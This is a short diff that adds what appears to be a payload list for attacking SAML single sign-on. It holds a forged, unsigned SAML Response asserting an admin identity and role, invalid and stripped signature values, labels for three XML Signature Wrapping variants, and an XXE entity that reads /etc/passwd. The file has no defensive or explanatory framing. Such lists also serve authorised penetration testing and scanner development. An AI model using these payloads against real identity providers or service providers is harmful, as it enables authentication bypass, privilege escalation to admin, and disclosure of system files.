@@ -1,0 +1,8 @@
+<samlp:Response><saml:Assertion><saml:Subject><saml:NameID>admin@corp.com</saml:NameID></saml:Subject><saml:AuthnStatement/><saml:AttributeStatement><saml:Attribute Name="Role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>
+SignatureValue: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA== (invalid signature)
+ds:SignatureValue: (empty - removed signature)
+XSW1: duplicate assertion with modified NameID
+XSW2: assertion wrapped in Extensions element
+XSW3: forged assertion outside signature scope
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"><saml:Assertion><saml:NameID>admin</saml:NameID></saml:Assertion></samlp:Response>
